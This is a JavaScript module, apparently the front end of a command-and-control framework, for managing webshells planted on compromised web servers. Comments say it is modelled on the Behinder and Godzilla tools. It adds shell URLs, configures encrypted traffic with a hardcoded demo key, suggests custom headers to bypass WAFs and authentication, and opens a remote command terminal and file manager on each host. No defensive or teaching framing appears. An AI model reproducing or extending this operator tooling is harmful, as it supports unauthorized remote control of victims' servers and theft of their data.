// app-webshell.js - WebShell 管理（参考冰蝎/哥斯拉的管理界面）
// 独立一级菜单：手动添加 WebShell URL，C2 直接向 URL 发请求操作
// 每个 WebShell 可独立配置：加密方式/密码/HTTP头/超时/代理

app.webshells = [];
app._wsShowAdvanced = false;  // 高级配置折叠状态

app.loadWebshells = function() {
    API.get('/api/webshell/list').then(data => {
        this.webshells = data || [];
        this.render();
    }).catch(e => this._notify('加载 WebShell 列表失败: ' + e.message, 'error'));
};

app.renderWebshells = function() {
    const list = this.webshells || [];
    const advStyle = this._wsShowAdvanced ? '' : 'display:none;';
    // 从全局配置同步加密默认值（必须与生成 WebShell 时的加密配置一致，否则通信失败）
    const enc = (this._settingsData && this._settingsData.encryption) || {};
    const globalAlgo = enc.algorithm || 'aes-128-cbc';
    const globalPass = enc.password || 'c2_demo_key_2024';
    const globalAlgoNorm = globalAlgo === 'aes' ? 'aes-128-cbc' : globalAlgo;
    const encOptions = ['none', 'aes-128-cbc', 'aes-256-cbc', 'rc4', 'chacha20', 'xor'].map(a => {
        const labels = {'none':'不加密','aes-128-cbc':'AES-128-CBC','aes-256-cbc':'AES-256-CBC','rc4':'RC4','chacha20':'ChaCha20','xor':'XOR'};
        const sel = a === globalAlgoNorm ? ' selected' : '';
        return `<option value="${a}"${sel}>${labels[a] || a}</option>`;
    }).join('');

    return `
        <div style="display:flex; gap:12px; margin-bottom:16px; align-items:center; flex-wrap:wrap;">
            <div class="card" style="padding:8px 16px; display:flex; gap:16px; align-items:center;">
                <div><span style="color:#8b949e; font-size:11px;">WebShell 总数</span> <b style="color:#e0e6ed;">${list.length}</b></div>
            </div>
        </div>

        <div class="card" style="padding:24px; margin-bottom:20px;">
            <h3 style="margin-bottom:16px; font-size:16px;"><i class="fas fa-plus-circle" style="color:#3fb950;"></i> 添加 WebShell</h3>
            <!-- 加密配置同步提示（必须与生成 WebShell 时的加密配置一致） -->
            <div style="font-size:11px; color:#3fb950; padding:8px 10px; background:#0d1117; border:1px solid #238636; border-radius:6px; margin-bottom:14px;">
                <i class="fas fa-link"></i> 加密配置已同步全局设置: <b>${globalAlgoNorm.toUpperCase()}</b> | 密码: <b>${globalPass ? globalPass.slice(0,3)+'***' : '(空)'}</b>
                <span style="color:#d29922; margin-left:8px;"><i class="fas fa-exclamation-triangle"></i> 必须与生成 WebShell 时使用的加密方式和密码完全一致，否则通信失败</span>
            </div>
            <!-- 基础配置 -->
            <div style="display:grid; grid-template-columns:3fr 1fr; gap:12px; margin-bottom:12px;">
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">WebShell URL <span style="color:#f85149;">*</span></label>
                    <input type="text" class="input" id="wsUrl" placeholder="http://192.168.0.9/shell.php" style="width:100%;">
                </div>
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">名称（可选）</label>
                    <input type="text" class="input" id="wsName" placeholder="目标Web服务器">
                </div>
            </div>
            <!-- 加密配置 -->
            <div style="display:grid; grid-template-columns:1fr 2fr; gap:12px; margin-bottom:12px;">
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密方式</label>
                    <select class="select" id="wsEncAlgo" onchange="app._onWsEncChange()">
                        ${encOptions}
                    </select>
                </div>
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密密码</label>
                    <input type="text" class="input" id="wsEncPassword" value="${globalPass}" placeholder="留空=使用全局密码">
                </div>
            </div>
            <!-- 高级配置折叠 -->
            <div style="margin-bottom:12px;">
                <a href="javascript:void(0)" onclick="app._wsShowAdvanced=!app._wsShowAdvanced; app.render()" style="font-size:12px; color:#58a6ff;">
                    <i class="fas fa-cog"></i> 高级配置（HTTP头/超时/代理）${this._wsShowAdvanced ? ' ▲' : ' ▼'}
                </a>
            </div>
            <div id="wsAdvancedConfig" style="${advStyle}">
                <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; margin-bottom:12px;">
                    <div>
                        <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">超时设置 (秒)</label>
                        <input type="number" class="input" id="wsTimeout" value="30" min="5" max="300">
                    </div>
                    <div>
                        <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">代理设置</label>
                        <input type="text" class="input" id="wsProxy" placeholder="http://127.0.0.1:8080（留空=直连）">
                    </div>
                </div>
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">自定义 HTTP 头 (JSON 格式)</label>
                    <textarea class="input" id="wsHttpHeaders" rows="3" placeholder='{"User-Agent": "Mozilla/5.0", "Cookie": "session=xxx", "Authorization": "Bearer xxx"}' style="width:100%; font-family:monospace; font-size:11px; resize:vertical;"></textarea>
                    <div style="font-size:11px; color:#6e7681; margin-top:4px;">用于绕过 WAF/认证，每行一个 HTTP 头（JSON 格式）</div>
                </div>
            </div>
            <div style="display:flex; gap:8px; margin-top:16px;">
                <button class="btn btn-primary" style="padding:10px 20px;" onclick="app.addWebshell()">
                    <i class="fas fa-link"></i> 添加并验证
                </button>
            </div>
            <div style="font-size:11px; color:#6e7681; margin-top:10px;">
                <i class="fas fa-info-circle"></i> 添加 WebShell 后，C2 会自动验证连通性并获取系统信息。每个 WebShell 可独立配置加密/超时/代理/自定义头。
            </div>
        </div>

        <div class="card" style="padding:24px;">
            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:16px;">
                <h3 style="font-size:16px;"><i class="fas fa-globe" style="color:#58a6ff;"></i> WebShell 列表</h3>
                <button class="btn btn-secondary" style="padding:4px 12px; font-size:12px;" onclick="app.loadWebshells()">
                    <i class="fas fa-sync-alt"></i> 刷新
                </button>
            </div>
            ${list.length > 0 ? `
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#161b22; font-size:12px; color:#8b949e;">
                        <th style="padding:10px 12px; text-align:left;">Session ID</th>
                        <th style="padding:10px 12px; text-align:left;">主机名</th>
                        <th style="padding:10px 12px; text-align:left;">WebShell URL</th>
                        <th style="padding:10px 12px; text-align:left;">加密</th>
                        <th style="padding:10px 12px; text-align:left;">系统</th>
                        <th style="padding:10px 12px; text-align:left;">添加时间</th>
                        <th style="padding:10px 12px; text-align:left;">操作</th>
                    </tr>
                </thead>
                <tbody>
                    ${list.map(c => {
                        const sessId = c.session_id || '-';
                        const encAlgo = c.webshell_enc_algo || 'none';
                        const hasOwnPass = c.webshell_enc_password && c.webshell_enc_password.length > 0;
                        const passSource = hasOwnPass ? '独立密码' : '全局密码';
                        const encBadge = encAlgo === 'none' ?
                            `<span style="color:#f85149; font-size:10px;">明文</span>` :
                            `<div><span style="color:#3fb950; font-size:10px;">${encAlgo.toUpperCase()}</span><br><span style="color:#6e7681; font-size:9px;">${passSource}</span></div>`;
                        return `
                        <tr class="table-row" onclick="app.selectClient('${c.client_id}'); app.selectedClient = this.webshells.find(x=>x.client_id==='${c.client_id}'); app.render();">
                            <td style="padding:10px 12px; font-family:monospace; font-size:12px; color:#58a6ff;">
                                <i class="fas fa-link" style="margin-right:4px;"></i>${sessId}
                            </td>
                            <td style="padding:10px 12px; font-weight:600;">
                                <i class="fas fa-globe" style="margin-right:6px; color:#58a6ff;"></i>${c.hostname || '未知'}
                            </td>
                            <td style="padding:10px 12px; font-family:monospace; font-size:11px; max-width:250px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${c.webshell_url || ''}">
                                ${c.webshell_url || '-'}
                            </td>
                            <td style="padding:10px 12px;">${encBadge}</td>
                            <td style="padding:10px 12px; font-size:12px;">${c.os || '-'} ${c.arch || ''}</td>
                            <td style="padding:10px 12px; font-size:11px; color:#8b949e;">${c.session_started ? c.session_started.slice(0,19).replace('T',' ') : '-'}</td>
                            <td style="padding:10px 12px;">
                                <div style="display:flex; gap:6px;">
                                    <button class="btn btn-primary" style="padding:4px 8px; font-size:11px;" title="命令终端" onclick="event.stopPropagation(); app.openTab('terminal', '${c.client_id}')">
                                        <i class="fas fa-terminal"></i>
                                    </button>
                                    <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" title="文件管理" onclick="event.stopPropagation(); app.openTab('files', '${c.client_id}')">
                                        <i class="fas fa-folder"></i>
                                    </button>
                                    <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" title="编辑配置" onclick="event.stopPropagation(); app.editWebshell('${c.client_id}')">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" title="验证连通性" onclick="event.stopPropagation(); app.checkWebshell('${c.client_id}')">
                                        <i class="fas fa-plug"></i>
                                    </button>
                                    <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" title="删除" onclick="event.stopPropagation(); app.deleteClient('${c.client_id}', '${c.hostname || c.client_id}')">
                                        <i class="fas fa-trash-alt"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                        `;
                    }).join('')}
                </tbody>
            </table>
            ` : `
                <div style="text-align:center; padding:60px; color:#8b949e;">
                    <i class="fas fa-globe" style="font-size:48px; margin-bottom:16px;"></i>
                    <div>暂无 WebShell，请在上方添加 URL</div>
                </div>
            `}
        </div>
    `;
};

// 加密方式切换时启用/禁用密码输入框
app._onWsEncChange = function() {
    const algo = document.getElementById('wsEncAlgo')?.value || 'none';
    const passInput = document.getElementById('wsEncPassword');
    if (passInput) {
        if (algo === 'none') {
            passInput.disabled = true;
            passInput.value = '';
        } else {
            passInput.disabled = false;
            // 切回加密算法时，如果密码为空则恢复全局密码
            if (!passInput.value.trim()) {
                const enc = (this._settingsData && this._settingsData.encryption) || {};
                passInput.value = enc.password || 'c2_demo_key_2024';
            }
        }
    }
};

// 添加 WebShell URL（参考冰蝎/哥斯拉的 URL 管理，支持独立配置）
app.addWebshell = function() {
    const url = document.getElementById('wsUrl').value.trim();
    const name = document.getElementById('wsName').value.trim();
    const encAlgo = document.getElementById('wsEncAlgo')?.value || 'none';
    const encPassword = document.getElementById('wsEncPassword')?.value.trim() || '';
    const httpHeaders = document.getElementById('wsHttpHeaders')?.value.trim() || '';
    const timeout = parseInt(document.getElementById('wsTimeout')?.value || '30');
    const proxy = document.getElementById('wsProxy')?.value.trim() || '';

    if (!url) { this._notify('请输入 WebShell URL', 'error'); return; }

    // 验证 URL 格式
    try {
        new URL(url);
    } catch(e) {
        this._notify('URL 格式不正确', 'error');
        return;
    }

    // 验证 HTTP 头 JSON 格式
    if (httpHeaders) {
        try {
            JSON.parse(httpHeaders);
        } catch(e) {
            this._notify('HTTP 头格式错误，请输入有效的 JSON', 'error');
            return;
        }
    }

    const btn = document.querySelector('[onclick="app.addWebshell()"]');
    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    const loading = this._notify('正在连接 WebShell 并获取系统信息...', 'loading', 0);

    API.post('/api/webshell/add', {
        url: url, name: name,
        enc_algo: encAlgo, enc_password: encPassword,
        http_headers: httpHeaders, timeout: timeout, proxy: proxy
    }).then(r => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        if (r.success) {
            const si = r.sysinfo || {};
            this._notify(`WebShell 添加成功: ${si.hostname || name || 'unknown'} (${si.os || ''} ${si.arch || ''})`, 'success');
            this.loadWebshells();
            // 清空输入框
            document.getElementById('wsUrl').value = '';
            document.getElementById('wsName').value = '';
            document.getElementById('wsEncPassword').value = '';
            document.getElementById('wsHttpHeaders').value = '';
            document.getElementById('wsProxy').value = '';
        } else {
            this._notify('添加失败: ' + (r.error || '未知错误'), 'error');
        }
    }).catch(e => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        this._notify('添加失败: ' + (e.message || e), 'error');
    });
};

// 验证 WebShell 连通性（发送 sysinfo 请求）
app.checkWebshell = function(clientId) {
    const loading = this._notify('正在验证 WebShell 连通性...', 'loading', 0);
    API.post(`/api/webshell/${clientId}/exec`, { action: 'sysinfo', param: {} }).then(r => {
        loading.remove();
        if (r.status === 'completed') {
            let info = r.result;
            try { info = JSON.parse(info); } catch(e) {}
            if (typeof info === 'object') {
                this._notify(`连通正常: ${info.hostname || ''} (${info.os || ''} ${info.arch || ''})`, 'success');
            } else {
                this._notify('连通正常: ' + String(info).slice(0, 100), 'success');
            }
        } else {
            this._notify('验证失败: ' + (r.error || r.result || '未知错误'), 'error');
        }
    }).catch(e => {
        loading.remove();
        this._notify('验证失败: ' + (e.message || e), 'error');
    });
};

// 编辑 WebShell 配置（弹出模态框，预填已有配置）
app.editWebshell = function(clientId) {
    const ws = (this.webshells || []).find(x => x.client_id === clientId);
    if (!ws) { this._notify('未找到该 WebShell', 'error'); return; }

    const encOptions = ['none', 'aes-128-cbc', 'aes-256-cbc', 'rc4', 'chacha20', 'xor'].map(a => {
        const labels = {'none':'不加密','aes-128-cbc':'AES-128-CBC','aes-256-cbc':'AES-256-CBC','rc4':'RC4','chacha20':'ChaCha20','xor':'XOR'};
        const sel = a === (ws.webshell_enc_algo || 'none') ? ' selected' : '';
        return `<option value="${a}"${sel}>${labels[a] || a}</option>`;
    }).join('');

    const httpHeaders = ws.webshell_http_headers || '';
    const timeout = ws.webshell_timeout || 30;
    const proxy = ws.webshell_proxy || '';
    const encPass = ws.webshell_enc_password || '';

    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
    modal.innerHTML = `
        <div class="modal" style="max-width:600px;">
            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:16px;">
                <h3 style="font-size:16px;"><i class="fas fa-edit" style="color:#58a6ff;"></i> 编辑 WebShell 配置</h3>
                <span class="badge badge-green">${ws.session_id || ws.client_id}</span>
            </div>
            <div style="font-size:12px; color:#8b949e; margin-bottom:14px;">
                <i class="fas fa-info-circle"></i> 修改 URL / 加密方式 / 密码后会自动重新验证连通性
            </div>
            <div style="margin-bottom:12px;">
                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">WebShell URL <span style="color:#f85149;">*</span></label>
                <input type="text" class="input" id="editWsUrl" value="${(ws.webshell_url || '').replace(/"/g, '&quot;')}" style="width:100%;">
            </div>
            <div style="margin-bottom:12px;">
                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">名称（可选）</label>
                <input type="text" class="input" id="editWsName" value="${(ws.hostname || '').replace(/"/g, '&quot;')}">
            </div>
            <div style="display:grid; grid-template-columns:1fr 2fr; gap:12px; margin-bottom:12px;">
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密方式</label>
                    <select class="select" id="editWsEncAlgo">
                        ${encOptions}
                    </select>
                </div>
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密密码</label>
                    <input type="text" class="input" id="editWsEncPassword" value="${encPass.replace(/"/g, '&quot;')}" placeholder="留空=使用全局密码">
                </div>
            </div>
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:12px;">
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">超时设置 (秒)</label>
                    <input type="number" class="input" id="editWsTimeout" value="${timeout}" min="5" max="300">
                </div>
                <div>
                    <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">代理设置</label>
                    <input type="text" class="input" id="editWsProxy" value="${proxy.replace(/"/g, '&quot;')}" placeholder="http://127.0.0.1:8080（留空=直连）">
                </div>
            </div>
            <div style="margin-bottom:16px;">
                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">自定义 HTTP 头 (JSON 格式)</label>
                <textarea class="input" id="editWsHttpHeaders" rows="3" placeholder='{"User-Agent": "Mozilla/5.0", "Cookie": "session=xxx"}' style="width:100%; font-family:monospace; font-size:11px; resize:vertical;">${httpHeaders.replace(/</g, '&lt;')}</textarea>
            </div>
            <div style="display:flex; gap:10px; justify-content:flex-end;">
                <button class="btn btn-secondary" onclick="this.closest('.modal-overlay').remove()">取消</button>
                <button class="btn btn-primary" id="editWsSaveBtn" onclick="app.saveWebshellEdit('${clientId}', this)">
                    <i class="fas fa-save"></i> 保存
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
};

// 保存 WebShell 编辑
app.saveWebshellEdit = function(clientId, btn) {
    const url = document.getElementById('editWsUrl').value.trim();
    const name = document.getElementById('editWsName').value.trim();
    const encAlgo = document.getElementById('editWsEncAlgo').value;
    const encPassword = document.getElementById('editWsEncPassword').value.trim();
    const httpHeaders = document.getElementById('editWsHttpHeaders').value.trim();
    const timeout = parseInt(document.getElementById('editWsTimeout').value || '30');
    const proxy = document.getElementById('editWsProxy').value.trim();

    if (!url) { this._notify('URL 不能为空', 'error'); return; }

    if (httpHeaders) {
        try { JSON.parse(httpHeaders); }
        catch(e) { this._notify('HTTP 头格式错误，请输入有效的 JSON', 'error'); return; }
    }

    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    const loading = this._notify('正在保存并验证 WebShell 配置...', 'loading', 0);

    API.post(`/api/webshell/${clientId}/edit`, {
        url, name, enc_algo: encAlgo, enc_password: encPassword,
        http_headers: httpHeaders, timeout, proxy
    }).then(r => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        if (r.success) {
            this._notify('WebShell 配置已更新', 'success');
            document.querySelector('.modal-overlay')?.remove();
            this.loadWebshells();
        } else {
            this._notify('保存失败: ' + (r.error || '未知错误'), 'error');
        }
    }).catch(e => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        this._notify('保存失败: ' + (e.message || e), 'error');
    });
};
